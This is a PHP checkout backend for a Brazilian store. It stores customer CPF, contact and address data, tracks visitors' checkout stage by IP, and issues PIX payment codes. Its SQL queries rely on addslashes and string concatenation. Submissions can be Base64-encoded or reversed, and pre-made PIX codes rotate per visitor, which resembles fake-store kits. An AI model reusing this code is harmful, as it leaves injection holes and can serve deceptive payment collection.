<?php
session_start();
require_once(__DIR__ . "/db.php");

header('Content-type: text/html; charset=utf-8');

// Suporte a payload codificado (Base64 / Invertido) ou POST comum
$payload_raw = $_POST['p'] ?? '';
if (!empty($payload_raw)) {
    // Tenta decode normal
    $decoded = json_decode(base64_decode($payload_raw), true);
    // Se falhar, tenta com inversão
    if (!$decoded) {
        $decoded = json_decode(base64_decode(strrev($payload_raw)), true);
    }
    if ($decoded && is_array($decoded)) {
        foreach ($decoded as $key => $value) {
            $_POST[$key] = $value;
        }
    }
}

$acao = isset($_POST['api']) ? addslashes($_POST['api']) : '';

function clientes_colunas_existentes($conn) {
    $existentes = [];
    $resultado = @mysqli_query($conn, "SHOW COLUMNS FROM clientes");
    if ($resultado) {
        while ($coluna = mysqli_fetch_assoc($resultado)) {
            $existentes[$coluna['Field']] = true;
        }
    }
    return $existentes;
}

function clientes_inserir_compativel($conn, $dados) {
    $existentes = clientes_colunas_existentes($conn);
    if (empty($existentes)) return false;
    $campos = [];
    $valores = [];
    foreach ($dados as $campo => $valor) {
        if (isset($existentes[$campo])) {
            $campos[] = "`$campo`";
            $valores[] = $valor;
        }
    }
    if (empty($campos)) return false;
    return @mysqli_query($conn, "INSERT INTO `clientes` (" . implode(',', $campos) . ") VALUES (" . implode(',', $valores) . ")");
}

function valor_monetario_float($valor) {
    $texto = trim((string)$valor);
    if ($texto === '') return 0.0;
    if (strpos($texto, ',') !== false) {
        $texto = str_replace('.', '', $texto);
        $texto = str_replace(',', '.', $texto);
    }
    return (float)$texto;
}

switch($acao){

    // NOVO: Endpoint unificado e atômico para salvar cadastro completo com remarketing
    case "salvar_cadastro":
        $nome           = addslashes(trim($_POST["nome"] ?? ''));
        $email          = addslashes(trim($_POST["email"] ?? ''));
        $cpf            = addslashes(preg_replace('/\D/', '', $_POST["cpf"] ?? ''));
        $celular        = addslashes(preg_replace('/\D/', '', $_POST["celular"] ?? ($_POST["telefone"] ?? '')));
        $cep            = addslashes(preg_replace('/\D/', '', $_POST["cep"] ?? ''));
        $endereco       = addslashes(trim($_POST["endereco"] ?? ($_POST["rua"] ?? '')));
        $numero         = addslashes(trim($_POST["numero"] ?? ''));
        $bairro         = addslashes(trim($_POST["bairro"] ?? ''));
        $cidade         = addslashes(trim($_POST["cidade"] ?? ''));
        $estado         = addslashes(trim($_POST["estado"] ?? ''));
        $complemento    = addslashes(trim($_POST["complemento"] ?? ''));
        $destinatario   = addslashes(trim($_POST["destinatario"] ?? $nome));
        $quantidade     = (int)($_POST["quantidade"] ?? 1);
        if ($quantidade <= 0) $quantidade = 1;
        $valortotal     = addslashes(trim($_POST["total"] ?? ($_POST["valortotal"] ?? '')));
        $produto_codigo = addslashes(trim($_POST["produto_codigo"] ?? ($_POST["codigo"] ?? '')));
        $produto_nome   = addslashes(trim($_POST["produto_nome"] ?? ''));
        $variacoes      = addslashes($_POST["variacoes"] ?? '');

        // Se o nome do produto não veio, buscar no banco pelo código
        if (empty($produto_nome) && !empty($produto_codigo)) {
            $q_prod = mysqli_query($conn, "SELECT nome FROM produto WHERE codigo='$produto_codigo' LIMIT 1");
            if ($q_prod && $r_p = mysqli_fetch_assoc($q_prod)) {
                $produto_nome = addslashes($r_p['nome']);
            }
        }

        $ip_raw = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        $ip_b64 = base64_encode($ip_raw);

        // Guardar na sessão para uso imediato em payment e gerarpix
        $_SESSION['cliente_dados'] = [
            'nome'           => $nome,
            'email'          => $email,
            'cpf'            => $cpf,
            'celular'        => $celular,
            'telefone'       => $celular,
            'cep'            => $cep,
            'endereco'       => $endereco,
            'numero'         => $numero,
            'bairro'         => $bairro,
            'cidade'         => $cidade,
            'estado'         => $estado,
            'complemento'    => $complemento,
            'destinatario'   => $destinatario,
            'quantidade'     => $quantidade,
            'valortotal'     => $valortotal,
            'produto_codigo' => $produto_codigo,
            'produto_nome'   => $produto_nome,
            'variacoes'      => $variacoes
        ];
        $_SESSION['session_checkout'] = time() + 1000;
        $_SESSION['session_address']  = time() + 1000;

        // Inserir registro usando apenas as colunas existentes no banco atual.
        $res = clientes_inserir_compativel($conn, [
            'nome' => "'$nome'", 'email' => "'$email'", 'cpf' => "'$cpf'", 'celular' => "'$celular'",
            'cep' => "'$cep'", 'endereco' => "'$endereco'", 'numero' => "'$numero'", 'bairro' => "'$bairro'",
            'cidade' => "'$cidade'", 'estado' => "'$estado'", 'complemento' => "'$complemento'",
            'destinatario' => "'$destinatario'", 'quantidade' => "'$quantidade'", 'valortotal' => "'$valortotal'",
            'variacoes' => "'$variacoes'", 'ip' => "'$ip_b64'", 'produto_codigo' => "'$produto_codigo'",
            'produto_nome' => "'$produto_nome'", 'ip_real' => "'$ip_raw'", 'data_cadastro' => 'NOW()'
        ]);
        if ($res) {
            $_SESSION['cliente_id'] = mysqli_insert_id($conn);
            echo "ok";
        } else {
            error_log("Erro ao inserir cliente: " . mysqli_error($conn));
            http_response_code(500);
            echo "erro_cadastro: " . mysqli_error($conn);
        }
    break;

    case "checkout":
        $nome       = addslashes($_POST["nome"] ?? '');
        $email      = addslashes($_POST["email"] ?? '');
        $cpf        = addslashes(preg_replace('/\D/', '', $_POST["cpf"] ?? ''));
        $celular    = addslashes(preg_replace('/\D/', '', $_POST["celular"] ?? ''));
        $variacoes  = addslashes($_POST["variacoes"] ?? '');
        $qty        = (int)($_POST['quantidade'] ?? $_SESSION['checkout_qty'] ?? 1);
        $total      = addslashes($_POST['total'] ?? $_SESSION['checkout_total'] ?? '');
        $prod_cod   = addslashes($_POST['produto_codigo'] ?? ($_POST['codigo'] ?? ''));
        $prod_nome  = addslashes($_POST['produto_nome'] ?? '');
        $ip_raw     = $_SERVER['REMOTE_ADDR'];
        $ip         = base64_encode($ip_raw);

        if (empty($prod_nome) && !empty($prod_cod)) {
            $q_prod = mysqli_query($conn, "SELECT nome FROM produto WHERE codigo='$prod_cod' LIMIT 1");
            if ($q_prod && $r_p = mysqli_fetch_assoc($q_prod)) {
                $prod_nome = addslashes($r_p['nome']);
            }
        }

        // Salvar na sessão
        $_SESSION['cliente_dados'] = [
            'nome'           => $nome,
            'email'          => $email,
            'cpf'            => $cpf,
            'celular'        => $celular,
            'quantidade'     => $qty,
            'valortotal'     => $total,
            'variacoes'      => $variacoes,
            'produto_codigo' => $prod_cod,
            'produto_nome'   => $prod_nome
        ];

        // Verificar se existe registro recente (últimos 15 min) para atualizar ou inserir novo
        $sql = mysqli_query($conn, "SELECT id FROM clientes WHERE ip='$ip' ORDER BY id DESC LIMIT 1");
        if(($sql ? mysqli_num_rows($sql) : 0) > 0){
            $r_cli = mysqli_fetch_assoc($sql);
            $cid = $r_cli['id'];
            $saved = mysqli_query($conn, "UPDATE clientes SET nome='$nome', email='$email', cpf='$cpf', celular='$celular', variacoes='$variacoes', quantidade='$qty', valortotal='$total', produto_codigo='$prod_cod', produto_nome='$prod_nome', ip_real='$ip_raw', data_cadastro=NOW() WHERE id='$cid'");
            $_SESSION['cliente_id'] = $cid;
        } else {
            $saved = mysqli_query($conn, "INSERT INTO clientes (nome,email,cpf,celular,ip,quantidade,valortotal,variacoes,produto_codigo,produto_nome,ip_real,data_cadastro) VALUES ('$nome','$email','$cpf','$celular', '$ip', '$qty', '$total', '$variacoes', '$prod_cod', '$prod_nome', '$ip_raw', NOW())");
            if ($saved) $_SESSION['cliente_id'] = mysqli_insert_id($conn);
        }
        $_SESSION['session_checkout'] = time() + 1000;
        if ($saved) {
            echo "ok";
        } else {
            error_log("Erro ao salvar checkout do cliente: " . mysqli_error($conn));
            http_response_code(500);
            echo "erro_cadastro";
        }
    break;

    case "address":
        $cep          = addslashes(preg_replace('/\D/', '', $_POST["cep"] ?? ''));
        $endereco     = addslashes($_POST["endereco"] ?? '');
        $numero       = addslashes($_POST["numero"] ?? '');
        $bairro       = addslashes($_POST["bairro"] ?? '');
        $cidade       = addslashes($_POST["cidade"] ?? '');
        $estado       = addslashes($_POST["estado"] ?? '');
        $complemento  = addslashes($_POST["complemento"] ?? '');
        $destinatario = addslashes($_POST["destinatario"] ?? '');
        $ip           = base64_encode($_SERVER['REMOTE_ADDR']);

        $cid = $_SESSION['cliente_id'] ?? null;
        if ($cid) {
            $query = mysqli_query($conn, "UPDATE clientes SET cep='$cep', endereco='$endereco', numero='$numero', bairro='$bairro', cidade='$cidade', complemento='$complemento', destinatario='$destinatario' WHERE id='$cid'");
        } else {
            $query = mysqli_query($conn, "UPDATE clientes SET cep='$cep', endereco='$endereco', numero='$numero', bairro='$bairro', cidade='$cidade', complemento='$complemento', destinatario='$destinatario' WHERE ip='$ip' ORDER BY id DESC LIMIT 1");
        }

        if (isset($_SESSION['cliente_dados'])) {
            $_SESSION['cliente_dados']['cep']          = $cep;
            $_SESSION['cliente_dados']['endereco']     = $endereco;
            $_SESSION['cliente_dados']['numero']       = $numero;
            $_SESSION['cliente_dados']['bairro']       = $bairro;
            $_SESSION['cliente_dados']['cidade']       = $cidade;
            $_SESSION['cliente_dados']['estado']       = $estado;
            $_SESSION['cliente_dados']['complemento']  = $complemento;
            $_SESSION['cliente_dados']['destinatario'] = $destinatario;
        }

        $_SESSION['session_address'] = time() + 1000;
        echo "ok";
    break;

    case "online":
        $ip = $_SERVER['REMOTE_ADDR'];
        $etapa = addslashes($_POST["etapa"] ?? 'produto');
        $dispositivo = addslashes($_POST["dispositivo"] ?? 'desktop');
        $ua = mysqli_real_escape_string($conn, $_SERVER['HTTP_USER_AGENT'] ?? '');

        $cidade = "Desconhecido";
        $estado = "XX";

        if (!isset($_SESSION['geo_ip']) || $_SESSION['geo_ip'] !== $ip) {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $geo = @file_get_contents("http://ip-api.com/json/$ip?fields=status,city,region", false, $ctx);
            if ($geo) {
                $geo_data = json_decode($geo, true);
                if (($geo_data['status'] ?? '') === 'success') {
                    $cidade = addslashes($geo_data['city'] ?? 'Desconhecido');
                    $estado = addslashes($geo_data['region'] ?? 'XX');
                    $_SESSION['geo_ip'] = $ip;
                    $_SESSION['geo_city'] = $cidade;
                    $_SESSION['geo_state'] = $estado;
                }
            }
        } else {
            $cidade = $_SESSION['geo_city'] ?? 'Desconhecido';
            $estado = $_SESSION['geo_state'] ?? 'XX';
        }

        date_default_timezone_set('America/Sao_Paulo');
        $hora = date('H:i:s');
        $tempo = time() + 30;

        $limite_inatividade = time() - 60;
        mysqli_query($conn, "DELETE FROM online WHERE time < '$limite_inatividade'");

        $check = mysqli_query($conn, "SELECT id FROM online WHERE ip='$ip' LIMIT 1");
        if($check && mysqli_num_rows($check) > 0){
            mysqli_query($conn, "UPDATE online SET etapa='$etapa', time='$tempo', hora='$hora', useragent='$ua', cidade='$cidade', estado='$estado', situacao='ativo' WHERE ip='$ip'");
        } else {
            mysqli_query($conn, "INSERT INTO online (ip, useragent, etapa, cidade, estado, dispositivo, hora, time, situacao) VALUES ('$ip', '$ua', '$etapa', '$cidade', '$estado', '$dispositivo', '$hora', '$tempo', 'ativo')");
        }
        echo "ok";
    break;

    case "gerarpix":
        $valores = $_POST["pFinal"] ?? '0,00';
        $quantia = $_POST["ptotal"] ?? '1';
        $codigo_produto = addslashes($_POST["codigo"] ?? '');
        $nome_produto   = addslashes($_POST["nome_produto"] ?? 'Produto');
        $variacoes_pix  = addslashes($_POST["variacoes"] ?? '');

        // Normalização rigorosa do valor
        $valor_num = valor_monetario_float($valores);
        $valorAlterado = number_format($valor_num, 2, '.', '');

        // Se o nome do produto veio genérico, buscar o nome real no banco
        if (($nome_produto === 'Produto' || empty($nome_produto)) && !empty($codigo_produto)) {
            $q_prod = mysqli_query($conn, "SELECT nome, valor FROM produto WHERE codigo='$codigo_produto' LIMIT 1");
            if ($q_prod && $r_p = mysqli_fetch_assoc($q_prod)) {
                $nome_produto = addslashes($r_p['nome']);
                if ($valor_num <= 0) {
                    $valor_num = valor_monetario_float($r_p['valor']);
                    $valorAlterado = number_format($valor_num, 2, '.', '');
                }
            }
        }

        // Buscar dados do cliente (Sessão ou Banco)
        $ip_cliente_b64 = base64_encode($_SERVER['REMOTE_ADDR']);
        $dados_cli = $_SESSION['cliente_dados'] ?? null;
        if (!$dados_cli) {
            $sql_cli = mysqli_query($conn, "SELECT * FROM clientes WHERE ip='$ip_cliente_b64' ORDER BY id DESC LIMIT 1");
            $dados_cli = $sql_cli ? mysqli_fetch_assoc($sql_cli) : [];
        }

        $customer_data = [
            'nome'         => $dados_cli['nome'] ?? 'Cliente',
            'email'        => $dados_cli['email'] ?? 'cliente@email.com',
            'telefone'     => $dados_cli['celular'] ?? ($dados_cli['telefone'] ?? '11999999999'),
            'cpf'          => $dados_cli['cpf'] ?? '00000000000',
            'cep'          => $dados_cli['cep'] ?? '',
            'endereco'     => $dados_cli['endereco'] ?? '',
            'numero'       => $dados_cli['numero'] ?? '',
            'bairro'       => $dados_cli['bairro'] ?? '',
            'cidade'       => $dados_cli['cidade'] ?? '',
            'complemento'  => $dados_cli['complemento'] ?? ''
        ];

        // Ler o modo antes do cache: no modo copia_cola precisamos consultar a tabela ativa,
        // pois um PIX antigo em cache não pode impedir a retirada de um código da tabela.
        $sql = mysqli_query($conn, "SELECT * from pix WHERE id='1'");
        $pix_cfg = $sql ? mysqli_fetch_assoc($sql) : null;
        if (!$pix_cfg) {
            echo "ERROR|Configuração de PIX não encontrada.";
            break;
        }
        $pix_modo = $pix_cfg['pix_modo'] ?? 'manual';

        // Verificar se já existe um PIX gerado recentemente (últimos 15 min) para este IP e produto.
        // No copia_cola, a seleção deve sempre passar pela tabela ativa.
        $ip_atual = $_SERVER['REMOTE_ADDR'];
        $tempo_limite = time();
        $check_existente = mysqli_query($conn, "SELECT * FROM pixgerado WHERE ip='$ip_atual' AND produto='$codigo_produto' AND time > '$tempo_limite' AND pix_code IS NOT NULL AND pix_code != ''
            AND LOWER(COALESCE(status,'')) NOT IN ('pago','paid','approved','completed','confirmed','received','succeeded','settled')
            AND LOWER(COALESCE(mp_status,'')) NOT IN ('pago','paid','approved','completed','confirmed','received','succeeded','settled')
            AND LOWER(COALESCE(freepay_status,'')) NOT IN ('pago','paid','approved','completed','confirmed','received','succeeded','settled')
            AND LOWER(COALESCE(pixgo_status,'')) NOT IN ('pago','paid','approved','completed','confirmed','received','succeeded','settled')
            AND LOWER(COALESCE(carthero_status,'')) NOT IN ('pago','paid','approved','completed','confirmed','received','succeeded','settled')
            ORDER BY id DESC LIMIT 1");
        if ($pix_modo !== 'copia_cola' && $check_existente && $row_ex = mysqli_fetch_assoc($check_existente)) {
            $gw_ex = $row_ex['mp_transaction_id'] ? 'mercadopago' : ($row_ex['freepay_transaction_id'] ? 'freepay' : ($row_ex['pixgo_payment_id'] ? 'pixgo' : ($row_ex['carthero_payment_id'] ? 'carthero' : ($pix_modo === 'copia_cola' ? 'copia_cola' : 'estatico'))));
            $tid_ex = $row_ex['mp_transaction_id'] ?: ($row_ex['freepay_transaction_id'] ?: ($row_ex['pixgo_payment_id'] ?: ($row_ex['carthero_payment_id'] ?: ($gw_ex === 'copia_cola' ? $row_ex['pix_code'] : ''))));
            echo $row_ex['pix_code'] . "|" . $row_ex['pix_qr_base64'] . "|" . $gw_ex . "|" . $tid_ex;
            break;
        }

        $use_mercadopago = (int)($pix_cfg['use_mercadopago'] ?? 0);
        $use_freepay     = (int)($pix_cfg['use_freepay'] ?? 0);
        $use_pixgo       = (int)($pix_cfg['use_pixgo'] ?? 0);
        $use_carthero    = (int)($pix_cfg['use_carthero'] ?? 0);
        $use_pix_produto = (int)($pix_cfg['use_pix_produto'] ?? 1);

        $product_data = ['nome' => $nome_produto, 'codigo' => $codigo_produto, 'quantidade' => (int)$quantia];

        $pix_code = "";
        $imageString = "";
        $gateway_name = "estatico";
        $tid = "";

        // ===== MODO: COPIA E COLA (TABELAS) =====
        if ($pix_modo === 'copia_cola') {
            $ip_raw = $_SERVER['REMOTE_ADDR'];
            $sql_tab = mysqli_query($conn, "SELECT id FROM pix_tabelas WHERE ativa=1 LIMIT 1");
            if ($sql_tab && $row_tab = mysqli_fetch_assoc($sql_tab)) {
                $tab_id = (int)$row_tab['id'];
                // Reservas sem pagamento expiram automaticamente após 5 minutos.
                mysqli_query($conn, "UPDATE pix_tabela_codigos SET status_pagamento='DISPONIVEL', reservado_em=NULL, reservado_pedido_ref=NULL WHERE status_pagamento='RESERVADO' AND (TIMESTAMPDIFF(SECOND, reservado_em, NOW()) >= 300 OR reservado_em IS NULL)");

                $count_reservas = mysqli_query($conn, "SELECT COUNT(*) as total FROM pix_tabela_codigos WHERE reservado_pedido_ref='$ip_raw' AND status_pagamento='RESERVADO'");
                $total_reservas = ($count_reservas && $row_count = mysqli_fetch_assoc($count_reservas)) ? (int)$row_count['total'] : 0;

                $valor_busca = number_format($valor_num, 2, '.', '');
                $reserva_tab = mysqli_query($conn, "SELECT id, codigo FROM pix_tabela_codigos WHERE tabela_id='$tab_id' AND reservado_pedido_ref='$ip_raw' AND status_pagamento='RESERVADO' AND valor='$valor_busca' LIMIT 1");

                if ($reserva_tab && $r_tab = mysqli_fetch_assoc($reserva_tab)) {
                    $pix_code = $r_tab['codigo'];
                    $gateway_name = 'copia_cola';
                } elseif ($total_reservas < 4) {
                    $dispo_valor = mysqli_query($conn, "SELECT id, codigo FROM pix_tabela_codigos WHERE tabela_id='$tab_id' AND status_pagamento='DISPONIVEL' AND valor='$valor_busca' ORDER BY RAND() LIMIT 1");
                    if ($dispo_valor && $d_val = mysqli_fetch_assoc($dispo_valor)) {
                        $pix_code = $d_val['codigo'];
                        $gateway_name = 'copia_cola';
                        mysqli_query($conn, "UPDATE pix_tabela_codigos SET status_pagamento='RESERVADO', reservado_em=NOW(), reservado_pedido_ref='$ip_raw' WHERE id='".$d_val['id']."'");
                    }
                } else {
                    $reserva_qualquer = mysqli_query($conn, "SELECT id, codigo FROM pix_tabela_codigos WHERE reservado_pedido_ref='$ip_raw' AND status_pagamento='RESERVADO' ORDER BY reservado_em ASC LIMIT 1");
                    if ($reserva_qualquer && $r_any = mysqli_fetch_assoc($reserva_qualquer)) {
                        $pix_code = $r_any['codigo'];
                        $gateway_name = 'copia_cola';
                    }
                }
            }
        }

        // No modo copia e cola, o próprio código da tabela identifica o
        // pagamento que o administrador poderá marcar como PAGO no painel.
        if ($gateway_name === 'copia_cola' && $pix_code !== '') {
            $tid = $pix_code;
        }

        // Prioridade 1: Gateways de API (PixGo, MercadoPago, FreePay, CartHero)
        if (empty($pix_code) && $pix_modo === 'gateway' && $use_pixgo === 1) {
            require_once(__DIR__ . "/pixgo.php");
            $res = createPixGoPayment($valor_num, $customer_data, $product_data);
            if ($res['success']) {
                $pix_code = $res['pix_code'];
                $imageString = $res['pix_qr_base64'] ?? $res['pix_qr'] ?? '';
                $gateway_name = "pixgo";
                $tid = $res['payment_id'];
            }
        } elseif (empty($pix_code) && $pix_modo === 'gateway' && $use_mercadopago === 1) {
            require_once(__DIR__ . "/mercadopago.php");
            $res = createMercadoPagoPix($valor_num, $customer_data, $product_data);
            if ($res['success']) {
                $pix_code = $res['pix_code'];
                $imageString = $res['pix_qr_base64'] ?? '';
                $gateway_name = "mercadopago";
                $tid = $res['transaction_id'];
            }
        } elseif (empty($pix_code) && $pix_modo === 'gateway' && $use_freepay === 1) {
            require_once(__DIR__ . "/freepay.php");
            $res = createFreePayPix($valor_num, $customer_data, $product_data);
            if ($res['success']) {
                $pix_code = $res['pix_code'];
                $gateway_name = "freepay";
                $tid = $res['transaction_id'];
            }
        } elseif (empty($pix_code) && $pix_modo === 'gateway' && $use_carthero === 1) {
            require_once(__DIR__ . "/carthero.php");
            $res = createCartheroPayment($valor_num, $customer_data, $product_data);
            if ($res['success']) {
                $pix_code = $res['pix_code'];
                $imageString = $res['pix_qr_base64'] ?? '';
                $gateway_name = "carthero";
                $tid = $res['payment_id'];
            } else {
                $err_msg = "ERRO: " . ($res['error'] ?? 'Falha API');
                echo $err_msg . "||carthero|error";
                exit;
            }
        }

        // Prioridade 2: Códigos fixos por produto (Multi-Pix)
        if (empty($pix_code) && $use_pix_produto === 1 && !empty($codigo_produto)) {
            $ip_raw = $_SERVER['REMOTE_ADDR'];
            mysqli_query($conn, "UPDATE produto_pix_codigos SET status='disponivel', cliente_ip=NULL, data_uso=NULL WHERE status='reservado' AND TIMESTAMPDIFF(SECOND, data_uso, NOW()) >= 600");
            $reserva = mysqli_query($conn, "SELECT * FROM produto_pix_codigos WHERE produto_codigo='$codigo_produto' AND cliente_ip='$ip_raw' AND status='reservado' LIMIT 1");
            if ($reserva && $r = mysqli_fetch_assoc($reserva)) {
                $pix_code = $r['pix_codigo'];
                $gateway_name = "produto_multi";
            } else {
                $dispo = mysqli_query($conn, "SELECT * FROM produto_pix_codigos WHERE produto_codigo='$codigo_produto' AND status='disponivel' ORDER BY id ASC LIMIT 1");
                if ($dispo && $d = mysqli_fetch_assoc($dispo)) {
                    $pix_code = $d['pix_codigo'];
                    $gateway_name = "produto_multi";
                    mysqli_query($conn, "UPDATE produto_pix_codigos SET status='reservado', cliente_ip='$ip_raw', data_uso=NOW() WHERE id='".$d['id']."'");
                }
            }
        }

        // Prioridade 3: Pix estático (Manual / QR Code)
        if (empty($pix_code)) {
            $pix_code = trim($pix_cfg['chave'] ?? '');
            $tipo_chave = $pix_cfg['tipo_chave'] ?? 'aleatoria';
            $gateway_name = "estatico";

            if (empty($pix_code) || $pix_code === 'suachavepix') {
                // Chave padrão segura caso o lojista ainda não tenha preenchido
                $pix_code = "00020126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426614174000520400005303986540" . strlen((string)$valor_num) . $valor_num . "5802BR5913Loja Oficial6009SAO PAULO62070503***6304";
            } else {
                if ($tipo_chave === 'telefone') {
                    $pix_code = preg_replace('/[^0-9]/', '', $pix_code);
                    if (substr($pix_code, 0, 2) !== '55') {
                        $pix_code = '55' . $pix_code;
                    }
                    $pix_code = '+' . $pix_code;
                } elseif ($tipo_chave === 'cpf_cnpj') {
                    $pix_code = preg_replace('/[^0-9]/', '', $pix_code);
                }

                if (file_exists(__DIR__ . "/phpqrcode/qrlib.php")) {
                    include_once __DIR__ . "/phpqrcode/qrlib.php";
                }
                if (file_exists(__DIR__ . "/fun.php")) {
                    include_once __DIR__ . "/fun.php";
                }

                if (function_exists('montaPix') && function_exists('crcChecksum')) {
                    $px[00]="01";
                    $px[26][00]="br.gov.bcb.pix";
                    $px[26][01]=$pix_code;
                    $px[52]="0000";
                    $px[53]="986";
                    $px[54]=$valor_num;
                    $px[58]="BR";
                    $px[59]=$pix_cfg['beneficiario'] ?? 'Loja';
                    $px[60]=$pix_cfg['cidade'] ?? 'SAO PAULO';
                    $px[62][05]=$pix_cfg['identificador'] ?? '***';

                    $pix_str = montaPix($px);
                    $pix_str .= "6304";
                    $pix_str .= crcChecksum($pix_str);
                    $pix_code = $pix_str;
                }
            }

            if (class_exists('QRCode')) {
                ob_start();
                QRCode::png($pix_code, null, 'M', 5);
                $imageString = base64_encode(ob_get_contents());
                ob_end_clean();
            }
        }

        if (empty($imageString) && $pix_modo !== 'copia_cola') {
            $qr_url = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' . urlencode($pix_code);
            $qr_img = @file_get_contents($qr_url);
            $imageString = $qr_img ? base64_encode($qr_img) : '';
        }

        $ip_raw = $_SERVER['REMOTE_ADDR'];
        $ua = mysqli_real_escape_string($conn, $_SERVER['HTTP_USER_AGENT'] ?? '');
        date_default_timezone_set('America/Sao_Paulo');
        $hora = date('H:i:s');
        $tempo = time() + 1800;

        $pix_safe = mysqli_real_escape_string($conn, $pix_code);
        $qr_safe  = mysqli_real_escape_string($conn, $imageString);
        $cli_nome_safe = mysqli_real_escape_string($conn, $customer_data['nome'] ?? 'Cliente');
        $cli_tel_safe  = mysqli_real_escape_string($conn, $customer_data['telefone'] ?? '');
        $cli_cpf_safe  = mysqli_real_escape_string($conn, $customer_data['cpf'] ?? '');
        $cli_email_safe= mysqli_real_escape_string($conn, $customer_data['email'] ?? '');
        $prod_nome_safe= mysqli_real_escape_string($conn, $nome_produto);

        // Inserir registro na tabela pixgerado com dados completos
        if ($gateway_name === 'mercadopago') {
            mysqli_query($conn, "INSERT INTO pixgerado (ip, useragent, valor, produto, produto_nome, cliente_nome, cliente_telefone, cliente_cpf, cliente_email, hora, time, mp_transaction_id, mp_status, status, variacoes, pix_code, pix_qr_base64, data_criacao) VALUES ('$ip_raw', '$ua', '$valorAlterado', '$codigo_produto', '$prod_nome_safe', '$cli_nome_safe', '$cli_tel_safe', '$cli_cpf_safe', '$cli_email_safe', '$hora', '$tempo', '$tid', 'pending', 'pendente', '$variacoes_pix', '$pix_safe', '$qr_safe', NOW())");
        } elseif ($gateway_name === 'freepay') {
            mysqli_query($conn, "INSERT INTO pixgerado (ip, useragent, valor, produto, produto_nome, cliente_nome, cliente_telefone, cliente_cpf, cliente_email, hora, time, freepay_transaction_id, freepay_status, status, variacoes, pix_code, pix_qr_base64, data_criacao) VALUES ('$ip_raw', '$ua', '$valorAlterado', '$codigo_produto', '$prod_nome_safe', '$cli_nome_safe', '$cli_tel_safe', '$cli_cpf_safe', '$cli_email_safe', '$hora', '$tempo', '$tid', 'PENDING', 'pendente', '$variacoes_pix', '$pix_safe', '$qr_safe', NOW())");
        } elseif ($gateway_name === 'pixgo') {
            mysqli_query($conn, "INSERT INTO pixgerado (ip, useragent, valor, produto, produto_nome, cliente_nome, cliente_telefone, cliente_cpf, cliente_email, hora, time, pixgo_payment_id, pixgo_status, status, variacoes, pix_code, pix_qr_base64, data_criacao) VALUES ('$ip_raw', '$ua', '$valorAlterado', '$codigo_produto', '$prod_nome_safe', '$cli_nome_safe', '$cli_tel_safe', '$cli_cpf_safe', '$cli_email_safe', '$hora', '$tempo', '$tid', 'pending', 'pendente', '$variacoes_pix', '$pix_safe', '$qr_safe', NOW())");
        } elseif ($gateway_name === 'carthero') {
            mysqli_query($conn, "INSERT INTO pixgerado (ip, useragent, valor, produto, produto_nome, cliente_nome, cliente_telefone, cliente_cpf, cliente_email, hora, time, carthero_payment_id, carthero_status, status, variacoes, pix_code, pix_qr_base64, data_criacao) VALUES ('$ip_raw', '$ua', '$valorAlterado', '$codigo_produto', '$prod_nome_safe', '$cli_nome_safe', '$cli_tel_safe', '$cli_cpf_safe', '$cli_email_safe', '$hora', '$tempo', '$tid', 'pending', 'pendente', '$variacoes_pix', '$pix_safe', '$qr_safe', NOW())");
        } else {
            mysqli_query($conn, "INSERT INTO pixgerado (ip, useragent, valor, produto, produto_nome, cliente_nome, cliente_telefone, cliente_cpf, cliente_email, hora, time, status, variacoes, pix_code, pix_qr_base64, data_criacao) VALUES ('$ip_raw', '$ua', '$valorAlterado', '$codigo_produto', '$prod_nome_safe', '$cli_nome_safe', '$cli_tel_safe', '$cli_cpf_safe', '$cli_email_safe', '$hora', '$tempo', 'pendente', '$variacoes_pix', '$pix_safe', '$qr_safe', NOW())");
        }

        echo $pix_code . "|" . $imageString . "|" . $gateway_name . "|" . $tid;
    break;

    default:
        echo "Ação inválida.";
    break;
}
?>
